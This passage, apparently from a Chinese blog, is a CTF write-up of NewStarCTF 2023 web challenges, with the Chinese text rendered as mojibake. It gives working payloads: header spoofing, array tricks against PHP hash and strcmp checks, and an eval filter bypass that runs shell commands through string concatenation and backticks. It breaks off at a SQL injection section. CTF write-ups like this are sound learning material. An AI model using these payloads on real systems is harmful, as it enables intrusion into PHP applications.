ä¸ºæˆ‘çœ‹åˆ°<code>åªæœ‰æœ¬åœ°ç”¨æˆ·æ‰èƒ½è®¿é—®</code>ç¬¬ä¸€æƒ³åˆ°çš„å°±æ˜¯æ”¹<code>X-Forwarded-Forï¼š127.0.0.1</code>å’Œ<code>Client-Ip</code>å­—æ®µï¼Œä½†æ˜¯è¿™ä¿©éƒ½æ²¡ç”¨ã€‚æˆ‘å½“æ—¶äººéƒ½æ™•äº†æƒ³ä¸æ˜ç™½ä¸ºå•¥ä¸ç»™è¿‡ã€‚(æˆ‘å½“æ—¶æ€è·¯ä¹Ÿé”™äº†ï¼Œä¸€ç›´åœ¨æƒ³IPåœ°å€çš„é—®é¢˜ï¼Œåé¢è¿˜å»æ‰¾äº†<code>Authorization</code>å­—æ®µçš„ä¿¡æ¯)ã€‚è¿˜å¥½å½“æ—¶å†çœ‹å®‰æ’å†™çš„é‚£æœ¬CTFå®æˆ˜ä»å…¥é—¨åˆ°æå‡ï¼Œé‡Œé¢æœ‰ä¸ªé¢˜ç”¨çš„X-Real-IPå­—æ®µã€‚ã€‚ã€‚è¿æ°”å¥½æŠŠè¿™é¢˜åšå‡ºæ¥äº†~</p><p><img src="/img/a12.png" alt="a12"></p><p>GETä¼ å‚ï¼Œ?ctf&#x3D;ä»»æ„å°±èƒ½è¿‡äº†ã€‚</p><p><img src="/img/a13.png" alt="a13"></p><p>POSTä¼ å‚ï¼Œä»–è¯´æŠŠsecretè—èµ·æ¥äº†ï¼Œçœ‹çœ‹æºç é‡Œæœ‰æ²¡æœ‰å•¥å¥½ä¸œè¥¿ï¼š</p><p><code>&lt;!-- Secret: base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk) --&gt; //å¤§å°å†™æ•°å­—æ··åˆï¼Œä¸€çœ¼base64</code></p><p>è§£ç ï¼š<code>n3wst4rCTF2023g00000d</code></p><p><img src="/img/a14.png" alt="a14"></p><p>poweræ˜¯å¦æ˜¯ctferï¼ŸburpsuiteæŠ“ä¸‹åŒ…çœ‹çœ‹æœ‰æ²¡æœ‰è¿™ä¸ªå­—æ®µï¼š</p><p><img src="/img/a15.png" alt="a15"></p><p>æ”¹ä¸‹cookie</p><p><img src="/img/a16.png" alt="a16"></p><p>åé¢å°±æ˜¯æ”¹User-Agentå¤´å’ŒRefererå¤´(ä¸€ä¸ªæµè§ˆå™¨ä¿¡æ¯å•¥çš„ä¸€ä¸ªç½‘å€æ¥æº)ã€‚æœ€åä»–ä¼šæç¤ºåªæœ‰æœ¬åœ°ç”¨æˆ·æ‰èƒ½é€šè¿‡è¿™å…³ï¼Œ<code>X-Real-IP:127.0.0.1</code>å³å¯ã€‚(å¯èƒ½æˆ‘è¿™è¾ˆå­éƒ½å¿˜ä¸äº†X-Real-IPè¿™ä¸ªå¤´äº†)ã€‚</p><h2 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h2><p>é¢˜ç›®æè¿°ï¼šErrâ€¦â€¦..</p><p><img src="/img/a17.png" alt="a17"></p><p>çœ‹åˆ°è¿™é¢˜æˆ‘ç¬¬ä¸€æƒ³åˆ°çš„å°±æ˜¯æ¨¡æ¿æ³¨å…¥ã€‚ã€‚ç„¶ååœ¨é‚£è¯•49å•¥çš„ï¼Œå“ˆå“ˆã€‚ç»“æœç›´æ¥404äº†ã€‚ã€‚ä»–è¯´ç»™ä»–num1å’Œnum2ï¼Œæˆ‘å°±è¯•ç€getä¼ å‚äº†<code>?number1=1</code>,ç»“æœå‡ºäº†è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><p><img src="/img/a18.png" alt="a18"></p><p>flagå°±è—åœ¨é‡Œé¢ã€‚ã€‚è¿™ä¸ªç­‰å®˜æ–¹wpå‡ºæ¥äº†è¿˜è¦çœ‹ä¸€ä¸‹ï¼Œè¿™é¢˜æ„Ÿè§‰æ²¡åšæ˜ç™½ã€‚</p><h2 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h2><p>é¢˜ç›®æè¿°ï¼šPHPæ˜¯ä¸–ç•Œä¸Šæœ€å®‰å…¨çš„è¯­è¨€ï¼ŒçœŸçš„å—ï¼Ÿ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 1=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>] !== <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$flag1</span> = True;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 1&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag1</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 2=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$flag2</span> = True;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 2&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag2</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 3=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>],<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>)) == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-variable">$flag3</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 3&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag3</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 4=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>] &gt; <span class="hljs-number">2023</span>)&#123;<br>            <span class="hljs-variable">$flag4</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 4&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag4</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 5=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$var</span>)&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$var</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag5</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>    &#125;<br>&#125; <span class="hljs-comment">//ä¸€å…±äº”ä¸ªç»•è¿‡ï¼Œéƒ½æ‹¿ä¸‹åä¼šè¯».flagçš„å†…å®¹ã€‚</span><br></code></pre></td></tr></table></figure><p>å…ˆæ˜¯key1key2ä¸ç›¸ç­‰ä½†md5åŠ å¯†åå¼±ç›¸ç­‰ã€‚è¿™ä¸œè¥¿å¯ä»¥ç”¨ç¢°æ’ä¹Ÿå¯ä»¥ç”¨ä¸¤ä¸ªä¸œè¥¿åŠ å¯†åå¾—0eå¼€å¤´çš„å­—ç¬¦ä¸²ã€‚å¦‚æœè¦æ±‚å¼ºç›¸ç­‰çš„è¯ç›´æ¥è®©key1key2æ˜¯ä¸¤ä¸ªæ•°ç»„å°±è¡Œäº†(æ— æ³•å¯¹æ•°ç»„åŠ å¯†ä¼šè¿”å›null)ã€‚</p><p><code>?key1[]=1&amp;key2[]=2</code></p><p>ç¬¬äºŒä¸ªæ¡ä»¶åŒç†ï¼Œå…¶å®æˆ‘ä¹‹å‰è¿˜çœŸæ²¡ç¢°åˆ°è¿‡è¿™ç§æ¡ä»¶(ä¸€ä¸ªä¸œè¥¿MD5åŠ å¯†åç­‰äºè¯¥ä¸œè¥¿SHA1åŠ å¯†åçš„å€¼)ã€‚æˆ‘å½“æ—¶æƒ³ç€æ—¢ç„¶éƒ½æ˜¯hashå‡½æ•°é‚£å°±è®©key3ç­‰äºæ•°ç»„å‘—(å¼ºç›¸ç­‰ç»•è¿‡)ï¼Œç»“æœè¿˜çœŸç»•è¿‡äº†ã€‚</p><p><code>strcmp</code>è¿™ä¸œè¥¿ä¼šæ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ä¸­å¯¹åº”ä½ç½®çš„ASCIIå¤§å°ï¼Œå¦‚æœç›¸åŒå°±ç»§ç»­æ¯”è¾ƒä¸‹ä¸€ä¸ªã€‚<code>str1&gt;str2</code>å°±è¿”å›å¤§äº0ï¼Œç›¸åŒè¿”å›0ï¼Œ<code>str1&lt;str2</code>å°±è¿”å›å°äº0ã€‚</p><p><code>strcmp($_GET[&#39;key4&#39;],file_get_contents(&quot;/flag&quot;)</code>é¢˜ç›®æ„æ€æ˜¯æƒ³è®©æˆ‘ä»¬è¾“å…¥çš„<code>key4</code>å’Œ<code>flag</code>ç›¸ç­‰ï¼Œä½†æˆ‘ä»¬æ ¹æœ¬ä¸çŸ¥é“<code>flag</code>æ˜¯å¤šå°‘ã€‚è¿™æ—¶å¯ä»¥è®©<code>key4</code>æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œ<code>strcmp</code>æ¯”è¾ƒçš„æ˜¯å­—ç¬¦ä¸²ï¼Œå¦‚æœä¼ å…¥å…¶å®ƒç±»å‹ä¼šæŠ¥é”™ã€‚å‡ºé”™ä¼šè¿”å›0ï¼Œå®ç°ç»•è¿‡ã€‚</p><p><code>is_numeric</code>ï¼Œè¿™ä¸ªç®€å•ï¼Œç›´æ¥<code>key5=2024a</code>å³å¯ã€‚</p><p>æœ€åä¸€æ­¥POSTä¼ <code>key3[]=~&amp;flag5=~</code>ï¼Œåªè¦æ•°ç»„çš„å€¼åˆ«è§¦å‘æ­£åˆ™åŒ¹é…å°±è¡Œã€‚</p><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$password</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$password</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)===<span class="hljs-string">&quot;c4d038&quot;</span>)&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>        &#125;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>passwordç»MD5åŠ å¯†åå‰å…­ä½å¼ºç­‰äº<code>&quot;c4d038&quot;</code>ï¼Œè¿™ä¸œè¥¿è¦å†™ä¸ªè„šæœ¬æ‰¾ï¼Œç›´æ¥ç”¨ä¹‹å‰åšé¢˜çš„è„šæœ¬æ”¹ä¸€ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find</span>():<br>    mubiao = <span class="hljs-string">&#x27;c4d038&#x27;</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        string = <span class="hljs-built_in">str</span>(i)<br>        hash_object = hashlib.md5(string.encode())<br>        <span class="hljs-keyword">if</span> hash_object.hexdigest()[:<span class="hljs-number">6</span>] == mubiao: <span class="hljs-comment">#åˆ‡ç‰‡æ“ä½œï¼Œä»é›¶å¼€å§‹å–å…­ä½</span><br>            <span class="hljs-keyword">return</span> string<br>        i += <span class="hljs-number">1</span><br><br>result = find()<br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-comment">#ç»“æœï¼š114514</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥è¦ç»™<code>e_v.a.l</code>å‚æ•°èµ‹å€¼ï¼Œè€Œä¸”ä¼ è¿‡å»çš„å€¼ç»è¿‡æ­£åˆ™åŒ¹é…è¿‡æ»¤åä¼šè¢«evalæ‰§è¡Œã€‚<code>e_v.a.l</code>è¿™ä¸œè¥¿å¾ˆæ˜æ˜¾ä¸æ»¡è¶³å˜é‡åçš„è¦æ±‚ï¼šåŒ…å«äº†å°æ•°ç‚¹ã€‚çœ‹ä¸‹PHPå®˜æ–¹çš„è§£é‡Šï¼š</p><p><img src="/img/a19.png" alt="a19"></p><p>å†™ä¸€å°æ®µä»£ç ä½“ä¼šä¸€ä¸‹å’‹å›äº‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$var</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>];<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span><span class="hljs-string">&quot;hello&quot;</span>;<br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>POSTä¼ <code>e_v.a.l=&#39;hellowold!&#39;</code>ï¼š</p><p>ç»“æœï¼š<code>array(1) &#123;  [&quot;e_v_a_l&quot;]=&gt;  string(12) &quot;&#39;hellowold!&#39;&quot; &#125;</code></p><p>å¯ä»¥çœ‹åˆ°POSTä¼ é€’çš„å‚æ•°ä»<code>e_v.a.l</code>å˜æˆäº†<code>e_v_a_l</code>ï¼Œç©ºæ ¼åŒç†ã€‚(ä½†<code>e_v.a.l</code>å‚æ•°ä»æ²¡è¢«èµ‹å€¼)ã€‚</p><p>è¿™é‡Œ å¼•ç”¨ä¸‹mochuå¸ˆå‚…çš„è§£é‡Šï¼š</p><p>å½“<code>PHPç‰ˆæœ¬å°äº8</code>æ—¶ï¼Œå¦‚æœå‚æ•°ä¸­å‡ºç°ä¸­æ‹¬å·<code>[</code>ï¼Œä¸­æ‹¬å·ä¼šè¢«è½¬æ¢æˆä¸‹åˆ’çº¿<code>_</code>ï¼Œä½†æ˜¯ä¼šå‡ºç°è½¬æ¢é”™è¯¯å¯¼è‡´æ¥ä¸‹æ¥å¦‚æœè¯¥å‚æ•°åä¸­è¿˜æœ‰<code>éæ³•å­—ç¬¦</code>å¹¶ä¸ä¼šç»§ç»­è½¬æ¢æˆä¸‹åˆ’çº¿<code>_</code>ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœä¸­æ‹¬å·<code>[</code>å‡ºç°åœ¨å‰é¢ï¼Œé‚£ä¹ˆä¸­æ‹¬å·<code>[</code>è¿˜æ˜¯ä¼šè¢«è½¬æ¢æˆä¸‹åˆ’çº¿<code>_</code>ï¼Œä½†æ˜¯å› ä¸ºå‡ºé”™å¯¼è‡´æ¥ä¸‹æ¥çš„éæ³•å­—ç¬¦å¹¶ä¸ä¼šè¢«è½¬æ¢æˆä¸‹åˆ’çº¿<code>_</code>ã€‚</p><p>è¿˜æ˜¯ä¸Šé¢é‚£ä¸²ä»£ç ï¼Œå°è¯•<code>post</code>ä¼ å‚<code>e[v.a.l=&#39;hellowold!&#39;</code>.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$var</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>];<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span><span class="hljs-string">&quot;hello&quot;</span>;<br>&#125; <br><span class="hljs-meta">?&gt;</span> <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123; [<span class="hljs-string">&quot;e_v.a.l&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">12</span>) <span class="hljs-string">&quot;&#x27;hellowold!&#x27;&quot;</span> &#125;<br>hello<br></code></pre></td></tr></table></figure><p>æˆåŠŸç»•è¿‡ã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯æ€ä¹ˆç»•æ­£åˆ™åŒ¹é…è¿‡æ»¤äº†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>); <br></code></pre></td></tr></table></figure><p>è¿‡æ»¤äº†flag,é‚£çŒœæµ‹flagæ˜¯è—åœ¨&#x2F;flagåº•ä¸‹çš„ï¼Œç›´æ¥ä½¿ç”¨é€šé…ç¬¦ï¼š<code>/fl*</code>å³å¯ã€‚è¿‡æ»¤äº†<code>system</code>å¯ä»¥ä½¿ç”¨<code>(sy.(st).em)</code>ç»•è¿‡(å­—ç¬¦ä¸²æ‹¼æ¥)ã€‚è¿‡æ»¤äº†<code>cat</code>é‚£å°±ç”¨<code>tac</code>ã€‚è¿™é“é¢˜è¿‡æ»¤åœ°å¹¶ä¸æ€ä¹ˆä¸¥æ ¼ã€‚</p><p>payload:</p><p>password&#x3D;114514&amp;e[v.a.l&#x3D;(sy.(st).em)(<code>printf &quot;\154\163&quot;</code>);  æ³¨æ„printfå‰å’Œ163â€œåå„æœ‰ä¸€ä¸ªåå¼•å·ã€‚</p><p>è¿™é‡Œå…³äºç»•è¿‡çš„ä¸€äº›çŸ¥è¯†åœ¨ä¹‹å‰å†™çš„åšå®¢é‡Œè¯´äº†äº›ï¼Œå°±ä¸è¯¦ç»†å†™äº†(æ¯”è¾ƒæ‡’ï¼Œå“ˆå“ˆ)ã€‚</p><p>éæ³•å‚æ•°åä¼ å‚çš„é—®é¢˜å‚è€ƒäº†è¿™ä½å¸ˆå‚…çš„æ–‡ç« ï¼Œæ„Ÿè°¢ï¼</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/mochu7777777/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">115050295</span>?spm=<span class="hljs-number">1001.2014</span>.<span class="hljs-number">3001.5506</span><br></code></pre></td></tr></table></figure><h2 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h2><p>é¢˜ç›®æè¿°ï¼šç®€ç®€å•å•ã€éšå¿ƒæ‰€æ¬²</p><p><img src="/img/a20.png" alt="a20"></p><p>æ„Ÿè§‰åˆæ˜¯æœ€è®¨åŒçš„SQLæ³¨å…¥ã€‚ã€‚ã€‚</p><p>å…ˆçœ‹çœ‹æºç é‡Œæœ‰æ²¡æœ‰å•¥ä¸œè¥¿ï¼Œä¸»è¦çœ‹çœ‹ä»–è¿™ä¸ªç”¨æˆ·åå¯†ç æ˜¯æ€ä¹ˆé™åˆ¶çš„ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">value, type</span>) &#123;<br>            <span class="hljs-keyword">if</span> (type === <span class="hljs-string">&#x27;un&#x27;</span>) &#123;<br>                <span class="hljs-keyword">if</span> (value.<span class="hljs-property">length</span> &lt; <span class="hljs-number">3</span> || value.<span class="hljs-property">length</span> &gt; <span class="hljs-number">10</span>) &#123;<br>                    <span class="hljs-keyword">return</span> &#123;<br>                        <span class="hljs-attr">status</span>: <span class="hljs-literal">false</span>,<br>                        <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;ç”¨æˆ·åé•¿åº¦å¿…é¡»ä¸º3-10ä¸ªå­—ç¬¦&#x27;</span><br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-regexp">/^[a-zA-Z0-9_-]+$/</span>.<span class="hljs-title function_">test</span>(value)) &#123;<br>                    <span class="hljs-keyword">return</span> &#123;<br>                        <span class="hljs-attr">status</span>: <span class="hljs-literal">false</span>,<br>                        <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;ç”¨æˆ·åæ ¼å¼é”™è¯¯&#x27;</span><br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (type === <span class="hljs-string">&#x27;pw&#x27;</span>) &#123;<br>                <span class="hljs-keyword">if</span> (value.<span class="hljs-property">length</span> &lt; <span class="hljs-number">6</span> || value.<span class="hljs-property">length</span> &gt; <span class="hljs-number">18</span>) &#123;<br>                    <span class="hljs-keyword">return</span> &#123;<br>                        <span class="hljs-attr">status</span>: <span class="hljs-literal">false</span>,<br>                        <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;å¯†ç é•¿åº¦å¿…é¡»ä¸º6-18ä¸ªå­—ç¬¦&#x27;</span><br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-regexp">/^[a-zA-Z0-9!@#$%^&amp;_-]+$/</span>.<span class="hljs-title function_">test</span>(value)) &#123;<br>                    <span class="hljs-keyword">return</span> &#123;<br>                        <span class="hljs-attr">status</span>: <span class="hljs-literal">false</span>,<br>                        <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;å¯†ç æ ¼å¼é”™è¯¯&#x27;</span><br>                    &#125;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">return</span> &#123;<br>                <span class="hljs-attr">status</span>: <span class="hljs-literal">true</span>,<br>                <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;&#x27;</span><br>            &#125;<br>        